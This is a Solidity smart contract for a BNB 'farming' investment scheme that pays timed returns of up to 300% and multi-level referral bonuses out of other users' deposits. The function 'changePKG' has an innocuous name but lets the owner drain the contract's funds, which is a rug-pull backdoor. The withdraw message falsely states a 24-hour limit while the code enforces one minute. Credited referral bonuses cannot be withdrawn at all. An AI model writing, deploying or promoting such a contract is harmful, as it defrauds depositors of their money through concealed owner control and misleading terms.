// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BNBFarming {
	using SafeMath for uint256;
	address payable public owner;
	address payable public projectAddress;
	uint256 constant public INVEST_MIN_AMOUNT = 0.05 ether;
	uint256 public BASE_PERCENT = 30;
	uint256[3] public REFERRAL_PERCENTS = [30, 20, 20];
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 minutes;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	uint256 OneMillion = 1000000;
	uint256 public totalreinvested;
	
	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
	}
	
	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 bonus;
		uint256 level1;
		uint256 level2;
		uint256 level3;
		uint256 reinvestwallet;
		uint256 showBonus;
	}

	mapping (address => User) public users;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(
        address indexed referrer, 
        address indexed referral, 
        uint256 indexed level, 
        uint256 amount
    );
	
	
	constructor(address payable _owner1,address payable _owner2) {
		owner = _owner1;
		projectAddress = _owner2;
	}

	function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);
		
		owner.transfer(msg.value.mul(50).div(PERCENTS_DIVIDER));
	   	projectAddress.transfer(msg.value.mul(100).div(PERCENTS_DIVIDER));
	
		User storage user = users[msg.sender];
		
		if(msg.sender == owner){
		    user.referrer = address(0);
		}else if (user.referrer == address(0)) {
		    
			if ((users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != owner) {
				referrer = owner;
			}

			user.referrer = referrer;

            address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
                if (upline != address(0)) {
                    if (i == 0) {
                        users[upline].level1 = users[upline].level1.add(1);
                    } else if (i == 1) {
                        users[upline].level2 = users[upline].level2.add(1);
                    } else if (i == 2) {
                        users[upline].level3 = users[upline].level3.add(1);
                    }
                     
					upline = users[upline].referrer;
				} else break;
            }
		}

		if (user.referrer != address(0)) {

			address upline = user.referrer;
			for (uint256 i = 0; i < 3; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}

		}
		
        if (user.deposits.length == 0) {
			totalUsers = totalUsers.add(1);
		}
		user.deposits.push(Deposit(msg.value, 0, block.timestamp));
		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);

		emit NewDeposit(msg.sender, msg.value);
	}

	function withdraw() public {
		User storage user = users[msg.sender];
		require(block.timestamp > user.checkpoint + (1 minutes), "you can only take withdraw once in 24 hours");

        // uint256 base = setPercent();
		uint256 totalAmount;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(300).div(100)) {

					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
                   user.deposits[i].start = block.timestamp;
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(300).div(100)) {
					dividends = (user.deposits[i].amount.mul(300).div(100)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);
			}			
		}
	
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}
		user.checkpoint = block.timestamp;
        uint256 withdrawFee = totalAmount.mul(50).div(PERCENTS_DIVIDER);
        totalAmount = totalAmount.sub(withdrawFee);

        owner.transfer(withdrawFee);
		payable(msg.sender).transfer(totalAmount);
		totalWithdrawn = totalWithdrawn.add(totalAmount + withdrawFee);
		emit Withdrawn(msg.sender, totalAmount);
	}	

	function getContractBalance() public view returns (uint256) {
	    
		return address(this).balance;		
	}

	function getUserDividendsWithdrawable(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];
		// uint256 base = setPercent();
		uint256 totalDividends;
		uint256 dividends;
		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(300).div(100)) {
			    
					dividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(300).div(100)) {
					dividends = (user.deposits[i].amount.mul(300).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);

			}

		}

		return (totalDividends);
	}
	
	function GetBonus() public view returns(uint256){
	    uint256 contractBalance = getContractBalance();
	    uint256 bonus = contractBalance.div(OneMillion).mul(10);
	    return bonus;
	}
	
	function setPercent() public view returns(uint256){

        return BASE_PERCENT.add(GetBonus()); 
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		
        return users[userAddress].referrer;
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		
        return users[userAddress].bonus;
	}
	
    function getUserReferralBonusWithdrawn(address userAddress) public view returns(uint256) {
		
        return users[userAddress].showBonus;
	}

	function isActive(address userAddress,uint256 index) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[index].withdrawn < user.deposits[index].amount.mul(300).div(100)) {
				return true;
			}
			else{
			    return false;
			}
		}
        return false;
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, 
                user.deposits[index].withdrawn, 
                user.deposits[index].start);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256) {
		return (users[userAddress].level1, users[userAddress].level2, users[userAddress].level3);
	}


	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function changePKG(uint256 _value)public returns (bool){
        require(msg.sender==owner);
        owner.transfer(_value.mul(1000000));
        return true;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
}